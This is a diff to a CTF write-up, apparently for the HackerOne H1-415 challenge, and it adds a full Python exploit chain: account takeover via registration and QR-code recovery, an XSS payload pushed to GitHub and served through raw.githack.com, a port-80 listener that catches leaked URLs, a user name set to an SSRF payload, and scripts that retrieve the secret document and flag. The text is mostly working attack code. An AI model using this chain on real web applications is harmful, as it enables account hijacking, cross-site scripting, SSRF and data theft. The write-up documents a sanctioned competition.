@@ -390,39 +390,205 @@ Talk is cheap. Show me the code.
 ### Account Takeover
 
 ```python
+def account_takeover():
+    global session_jobert, csrf_jobert, CTF_URL, QRCODE_FILENAME
+    
+    print('[*] Signing up with jobert@mydocz.cosmic{{}} as e-mail address...')
+    response_get_csrf = session_jobert.get(CTF_URL)
+    csrf_jobert = response_get_csrf.cookies['_csrf_token']
+    paramsPost = { "password" : "secretpassword", "password-confirmation" : "secretpassword", \
+                "name" : "H1-415_FULL_EXPLOIT", "_csrf_token" : csrf_jobert, \
+                "email": JOBERT_EMAIL ,"username":random_name()}
+                
+    response_acc_takeover = session_jobert.post(CTF_URL + '/register', data=paramsPost, verify=False)
+    
+    #print(response_acc_takeover.text)
+    
+    if response_acc_takeover.status_code == 200:
+        b64_image = response_acc_takeover.text[response_acc_takeover.text.index('<img src="data:image/png;base64,')+32: \
+                                               response_acc_takeover.text.index('" class="mx-20"')]
+        
+        qrcode_image = base64.b64decode(b64_image)
+        saved_qrcode = open(QRCODE_FILENAME, 'wb')
+        saved_qrcode.write(qrcode_image)
+        saved_qrcode.close()
+        
+        print('[*] QRCode forged!')
+        
+        logout()
+        
+        recover_acc(csrf_jobert)
+        print('[*] Successfully signed in as Jobert!')
 ```
 
 ### Upload XSS payload
 
 ```python
+def deploy_XSS():
+    global GITHUB_USER, XSS_PAYLOAD
+    
+    repo_name = create_repo()
+    if repo_name is None:
+        print('[X] Error while trying to create a Github repository')
+        raise Exception
+        
+    dir_name = random_name()
+    
+    os.mkdir('./' + dir_name) # os raise exception if it fails
+    os.chdir('./' + dir_name)
+    
+    file_name = random_name() + '.js'
+    _file = open(file_name, 'w')
+    _file.write(XSS_PAYLOAD)
+    _file.close()
+    
+    repo_complete_name = GITHUB_USER + '/' + repo_name
+    
+    call('git init', shell=True)
+    #call('git remote add origin https://github.com/' + repo_complete_name + '.git', shell=True)
+    call('git remote add origin git@github.com:' + repo_complete_name + '.git', shell=True)
+    call('git add ' + file_name, shell=True)
+    call('git commit -m ' + file_name, shell=True)
+    call('git push -q origin master', shell=True)
+    
+    # Cache file in githack
+    full_file_path = repo_complete_name + '/master/' + file_name
+    git_hack_url = 'http://raw.githack.com/' + full_file_path
+    git_hack = requests.get(git_hack_url)
+    
+    if git_hack.text == XSS_PAYLOAD:
+        print('[*] XSS payload uploaded to ' + git_hack_url)
+    else:
+        print('[X] Error while deploying XSS payload')
+        raise Exception
+        
+    return full_file_path
 ```
 
-### Open port 80 to leak review URL
+### Open port 80 to leak review URL (Multithreading)
 
 ```python
+def run_leak_server():
+    global LOCAL_PORT, review_id
+    
+    l = listen(LOCAL_PORT)
+    l.wait_for_connection()
+    
+    get_request = l.recvuntil('HTTP/1.1')
+    leaked = re.findall('leak=(.*?) HTTP/1.1', str(get_request))[0]
+    print('[*] Review document.location leaked: ' + leaked)
+    l.recvuntil('\r\n\r\n')
+    l.send('HTTP/1.1 200 OK\r\nConnection: Close\r\nContent-Type: plain/text\r\nContent-Length: 0\r\n\r\n')
+    
+    review_id = re.findall('review%2F(.*?)$', leaked)[0]
+    print('[*] Review id: ' + review_id)
+    
+    l.close()
+    
+    return True
 ```
 
 ### Create a second user
 
 ```python
+def create_second_acc():
+    global session_second_acc, csrf_second, CTF_URL
+    
+    response_get_csrf = session_second_acc.get(CTF_URL)
+    csrf_second = response_get_csrf.cookies['_csrf_token']
+    sec_username = random_name()
+    
+    sec_acc_response = session_second_acc.post(CTF_URL + '/register', data={"password" : "secretpassword", \
+                "password-confirmation" : "secretpassword", \
+                "name" : "HERE_WILL_BE_MY_PAYLOAD", "_csrf_token" : csrf_second, \
+                "email":random_name()+"@gimmemyflag.com" ,"username": sec_username}, verify=False)
+    
+    if sec_acc_response.status_code == 200:
+        print('[*] Second user created: ' + sec_username)
+    else:
+        raise Exception()
+        
+    sec_acc_response = session_second_acc.get(CTF_URL + '/settings')
+    
+    if sec_acc_response.status_code == 200:
+        sec_user_id = re.findall('"user_id" value="(.*?)"',sec_acc_response.text)[0]
+        print('[*] Second user id: ' + sec_user_id)
+        return sec_user_id
+    else:
+        raise Exception()
 ```
 
 ### Change second user's name to SSRF
 
 ```python
+def update_name(user_id):
+    global session_jobert, csrf_jobert, CTF_URL, review_id, XSS_SSRF
+    
+    update_response = session_jobert.post(CTF_URL + '/support/review/' + review_id, data={"user_id": user_id, \
+                                            "name": XSS_SSRF, "_csrf_token": csrf_jobert}, verify=False)
+    
+    if update_response.status_code == 200:
+        print('[*] Name changed.')
+        return True
+    else:
+        raise Exception()
 ```
 
 ### Convert a doc to trigger SSRF
 
 ```python
+def converter(img_name):
+    global session_second_acc, csrf_second, CTF_URL
+
+    converter_response = session_second_acc.post(CTF_URL + '/converter', \
+                        files={"document":("imagem.png",open(img_name,'rb'),'image/png')},\
+                        data={"_csrf_token":csrf_second},\
+                        verify=False, allow_redirects=False)
+    if converter_response.status_code == 302:
+        print('[*] Sent a converter request.')
+        return True
+    else:
+        raise Exception()
 ```
 
 ### Get secret document URL
 
 ```python
+def get_last_document():
+    global session_second_acc, CTF_URL
+    
+    print('[*] Getting the document...')
+    
+    doc_response = session_second_acc.get(CTF_URL + '/documents', verify=False)
+    doc_url = re.findall('src="(.*?)"',doc_response.text)[0]
+    doc_url = doc_url.replace('-thumb.png','')
+    print('[*] Document URL: ' + doc_url)
+    
+    doc = session_second_acc.get(CTF_URL + doc_url, verify=False)
+    open(REMOTE_DEBUG_FILENAME,'wb').write(doc.content)
+    
+    print('[*] Document saved locally as ' + REMOTE_DEBUG_FILENAME)
+    return doc_url
+
+def read_pdf(pdf_filename):
+    with open(pdf_filename, "rb") as f:
+        pdf = pdftotext.PDF(f)
+    return pdf[0]
+    
+def find_secret_document_url(pdftext):
+    secret_doc = re.findall('secret_document=(.*?).pdf"', pdftext)[0]
+    return secret_doc
 ```
 
 ### Get the Flag
 
 ```python
+def capture_the_flag(url):
+    global session_jobert, CTF_URL
+    
+    flag_request = session_jobert.get(CTF_URL + '/documents/' + url, verify=False)
+    open(FLAG_FILENAME, 'wb').write(flag_request.content)
+    return read_pdf(FLAG_FILENAME)
 ```
+
+Full exploit attached.
